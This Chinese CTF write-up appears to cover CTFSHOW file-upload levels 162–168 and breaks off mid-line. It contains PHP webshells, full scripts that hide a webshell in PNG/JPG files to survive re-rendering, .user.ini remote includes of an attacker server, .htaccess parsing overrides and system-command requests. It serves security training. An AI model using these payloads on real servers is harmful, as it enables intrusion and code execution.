        <content type="html"><![CDATA[<h1 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>1、文件上传-二次渲染<br>2、文件上传-简单免杀变异<br>3、文件上传-.htaccess妙用<br>4、文件上传-PHP语言特性</p><h2 id="详细点"><a href="#详细点" class="headerlink" title="详细点"></a>详细点</h2><p>1、检测层面：前端，后端等<br>2、检测内容：文件头，完整性，二次渲染等<br>3、检测后缀：黑名单，白名单，MIME检测等<br>4、绕过技巧：多后缀解析，截断，中间件特性，条件竞争等</p><h2 id="本章课程内容"><a href="#本章课程内容" class="headerlink" title="本章课程内容"></a>本章课程内容</h2><p>1、文件上传-CTF赛题知识点<br>2、文件上传-中间件解析&amp;编辑器安全<br>3、文件上传-实例CMS文件上传安全分析</p><h1 id="实践-CTFSHOW-文件上传-162到170关卡"><a href="#实践-CTFSHOW-文件上传-162到170关卡" class="headerlink" title="实践-CTFSHOW-文件上传-162到170关卡"></a>实践-CTFSHOW-文件上传-162到170关卡</h1><h2 id="前置："><a href="#前置：" class="headerlink" title="前置："></a>前置：</h2><p>后门代码需要用特定格式后缀解析，不能以图片后缀解析脚本后门代码(解析漏洞除外)<br>如：jpg图片里面有php后门代码，不能被触发，所以连接不上后门</p><blockquote><p>如果要图片后缀解析脚本代码，一般会利用包含漏洞或解析漏洞，还有.user.ini&amp;.htaccess<br>包含：将某个文件的内容包含到另外一个文件当中去，例如：将png文件的所有内容包含到php文件头部或尾部。<br>解析：将某个文件解析为指定文件类型，例如：png解析为php。</p></blockquote><p>文件二次渲染：<br>1、判断上传前和上传后的文件大小及内容<br>2、判断上传后的文件返回数据包内容</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">题目是继承式的，前一道题是后一道题的基础</span><br><span class="line"></span><br><span class="line"><span class="number">162</span>  突破.过(大概思路明了了，但是题目有bug，无法复现)</span><br><span class="line">    数据包修改时啊，必须带文件头才能正常。</span><br><span class="line">        GTF89a</span><br><span class="line">    题目本身过滤了 . () &#123;&#125; ;等符号，空格也不行</span><br><span class="line"></span><br><span class="line">    利用远程包含IP转换地址后门调用执行</span><br><span class="line">        <span class="number">1</span>.搭建一个包含后门代码的网站</span><br><span class="line">        <span class="number">2</span>.把这个网站包含到靶场的上传文件当中</span><br><span class="line">        <span class="number">3</span>.为了包含方便，使用IP地址转换，把IP地址转换为数字组合</span><br><span class="line">        .user.ini   auto_prepend_file=png     <span class="comment">//无点号文件包含</span></span><br><span class="line">        png         <span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&#x27;http://794750069/&#x27;</span>&gt;  <span class="comment">//包含远程文件地址</span></span><br><span class="line">        https:<span class="comment">//www.bejson.com/convert/ip2int/  （IP地址转int字符串的网站）</span></span><br><span class="line"></span><br><span class="line">    严格过滤掉各个符号</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">163</span> 突破.上传删除(大概思路明了了，但是题目有bug，无法复现)</span><br><span class="line">    过滤 . () &#123;&#125; ;等 同时文件被删除</span><br><span class="line">    直接利用.user.ini包含远程</span><br><span class="line">        auto_prepend_file=http:<span class="comment">//794750069/</span></span><br><span class="line">        auto_prepend_file=http:<span class="comment">//794750069/</span></span><br><span class="line"></span><br><span class="line">    上面两种远程包含的前提是目标网站带有漏洞代码    <span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])<span class="meta">?&gt;</span></span><br><span class="line">    目前测试了一早上，没测试成功……(此方法暂时搁置)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">164</span> png二次渲染</span><br><span class="line">    二次渲染：网站一般有对图片的二次处理，使图片相较于原图有些修改。为了节约空间，可能会进行删除压缩修改图片的代码。</span><br><span class="line">        二次渲染可能删除后门代码。--图像网站比较注重。手工操作比较复杂。</span><br><span class="line">        手工修改插入后门代码，能不能被过滤掉靠运气。如果不是文件，传都传不上去。</span><br><span class="line">        手工插入全靠运气，或找到不会被二次渲染改变的区域。    </span><br><span class="line">        工具生成比较规矩，并且做到了插入不被删除的地方。</span><br><span class="line"></span><br><span class="line">    博客参照：https:<span class="comment">//blog.csdn.net/qq_40800734/article/details/105920149</span></span><br><span class="line">        规矩的运行下面php代码即可生成后门图片</span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">            <span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">                    <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">                    <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">                    <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">                    <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">                    <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">                    <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">                    <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            <span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">            <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">            <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">            <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">            <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    生成图片后上传，点击查看图片后进行如下操作</span><br><span class="line">         get: url&amp;<span class="number">0</span>=system         </span><br><span class="line">        post: <span class="number">1</span>=tac flag.php</span><br><span class="line">        ctfshow&#123;<span class="number">96321</span>d8f-b7f2-<span class="number">477</span>d-b6b7-d0aaf059fe6b&#125;</span><br><span class="line"></span><br><span class="line">    png删除规则：</span><br><span class="line">        <span class="number">1</span>.什么都删除</span><br><span class="line">        <span class="number">2</span>.只删除后门代码</span><br><span class="line">    </span><br><span class="line">    条件竞争：上传文件成功，文件没删除前，立刻访问，利用代码生效的那一刹那出行创建一个文件。可以把文件上传到其他目录，可以在删除前赶紧把结果发送出去。</span><br><span class="line">    上传的地址：upload/png</span><br><span class="line">    没上传之前一直访问upload post：代码利用PHP创建一个文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">165</span> jpg二次渲染</span><br><span class="line">    <span class="number">1</span>、先上传jpg正常，返回包发现渲染</span><br><span class="line">    <span class="number">2</span>、上传jpg渲染后保存，生成带代码图片</span><br><span class="line">        生成时调用的代码：</span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">                <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=eval(\$_POST[1]);?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">                    <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">                    <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">                    <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">                    <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">                        <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">                        <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">                        <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                            <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                            <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                                <span class="variable">$miniPayload</span> . </span><br><span class="line">                                <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                            <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                                    <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                            <span class="keyword">break</span>;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                                <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                                <span class="variable">$outStream</span> = </span><br><span class="line">                                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                                    <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                                        <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                            <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                                        <span class="number">0</span>,</span><br><span class="line">                                        <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                            <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                            &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                                <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                                <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">                    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">                    <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">                    <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">                        <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">                    <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                            <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">                    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">                    <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">                        <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                        <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">                        <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                                <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">                        <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">                        <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">                        <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">                        <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                            <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line">        CMD调用执行：php jpg.php <span class="number">1</span>.jpg </span><br><span class="line">        生成的图片不一定是能上传的，因为生成的结果可能每次都不一样。</span><br><span class="line"></span><br><span class="line">        关键点：文件包含，二次渲染，图片作为php代码执行。</span><br><span class="line"></span><br><span class="line"><span class="number">166</span> zip调用包含</span><br><span class="line">    直接上传zip后修改代码   (貌似改了版)</span><br><span class="line">    上传文件，插入：</span><br><span class="line">        POST /upload.php HTTP/<span class="number">1.1</span></span><br><span class="line">        Host: <span class="number">600884</span>d4-bde3-<span class="number">4359</span>-<span class="number">9</span>b6a-c35b3a4e1b93.challenge.ctf.show</span><br><span class="line">        User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">109.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">114.0</span></span><br><span class="line">        Accept: application/json, text/javascript, *<span class="comment">/*; q=0.01</span></span><br><span class="line"><span class="comment">        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">        Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">        X-Requested-With: XMLHttpRequest</span></span><br><span class="line"><span class="comment">        Content-Type: multipart/form-data; boundary=---------------------------13970034881279040118531567139</span></span><br><span class="line"><span class="comment">        Content-Length: 253</span></span><br><span class="line"><span class="comment">        Origin: http://600884d4-bde3-4359-9b6a-c35b3a4e1b93.challenge.ctf.show</span></span><br><span class="line"><span class="comment">        Connection: close</span></span><br><span class="line"><span class="comment">        Referer: http://600884d4-bde3-4359-9b6a-c35b3a4e1b93.challenge.ctf.show/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        -----------------------------13970034881279040118531567139</span></span><br><span class="line"><span class="comment">        Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;2.zip&quot;</span></span><br><span class="line"><span class="comment">        Content-Type: application/x-zip-compressed</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        &lt;?=eval($_POST[1])?&gt;</span></span><br><span class="line"><span class="comment">        -----------------------------13970034881279040118531567139--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    然后，上传完成后，会返回*/</span>：</span><br><span class="line">        &#123;<span class="string">&quot;code&quot;</span>:<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;686f051366d226dc70d1f63592b2f753.zip&quot;</span>&#125;</span><br><span class="line">    后面是对应的文件地址，访问压缩包的时候，属于文件包含下载：</span><br><span class="line">        http:<span class="comment">//600884d4-bde3-4359-9b6a-c35b3a4e1b93.challenge.ctf.show/upload/download.php?file=686f051366d226dc70d1f63592b2f753.zip</span></span><br><span class="line">    在浏览器使用hackbar，再使用post传入参数，并且在BP将数据包拦截：</span><br><span class="line">        POST /upload/download.php?file=<span class="number">686</span>f051366d226dc70d1f63592b2f753.zip HTTP/<span class="number">1.1</span></span><br><span class="line">        Host: <span class="number">600884</span>d4-bde3-<span class="number">4359</span>-<span class="number">9</span>b6a-c35b3a4e1b93.challenge.ctf.show</span><br><span class="line">        User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">109.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">114.0</span></span><br><span class="line">        Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">        Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">        Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">        Content-Length: 33</span></span><br><span class="line"><span class="comment">        Origin: http://600884d4-bde3-4359-9b6a-c35b3a4e1b93.challenge.ctf.show</span></span><br><span class="line"><span class="comment">        Connection: close</span></span><br><span class="line"><span class="comment">        Referer: http://600884d4-bde3-4359-9b6a-c35b3a4e1b93.challenge.ctf.show/upload/download.php?file=686f051366d226dc70d1f63592b2f753.zip</span></span><br><span class="line"><span class="comment">        Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        1=system%28%27ls%20..%2F%27%29%3B</span></span><br><span class="line"><span class="comment">                </span></span><br><span class="line"><span class="comment">    */</span>实验了下，需要使用URL编码，否则无回显。</span><br><span class="line">    BP返回的是文件列表</span><br><span class="line">    再传入这个即可得到flag：</span><br><span class="line">        <span class="number">1</span>=system%<span class="number">28</span>%<span class="number">27</span>tac%<span class="number">20</span>..%<span class="number">2</span>Fflag.php%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>B</span><br><span class="line"></span><br><span class="line"><span class="number">167</span> .htaccess妙用</span><br><span class="line">    .htaccess默认不支持nginx，设置后支持</span><br><span class="line">    .htaccess可以通过设置实现文件解析配置</span><br><span class="line">        将.png后缀的文件解析成php</span><br><span class="line">        AddType application/x-httpd-php .jpg </span><br><span class="line"></span><br><span class="line">    解题：</span><br><span class="line">        上传时改为后门代码，并且上传.<span class="title function_ invoke__">htaccess</span>(关键部分截取)</span><br><span class="line">        -----------------------------<span class="number">12155357919748644583173694937</span></span><br><span class="line">        Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;.htaccess&quot;</span></span><br><span class="line">        Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">        AddType application/x-httpd-php .jpg</span><br><span class="line">        -----------------------------<span class="number">12155357919748644583173694937</span>--</span><br><span class="line">    后面使用浏览器访问网站对应的图片地址，并且使用后门展示flag信息即可。</span><br><span class="line"></span><br><span class="line"><span class="number">168</span> 免杀后门</span><br><span class="line">    字符串拼接后执行上传操作</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="string">&#x27;syste&#x27;</span>;<span class="variable">$b</span>=<span class="string">&#x27;m&#x27;</span>;<span class="variable">$c</span>=<span class="variable">$a</span>.<span class="variable">$b</span>;<span class="variable">$c</span>(<span class="string">&#x27;tac 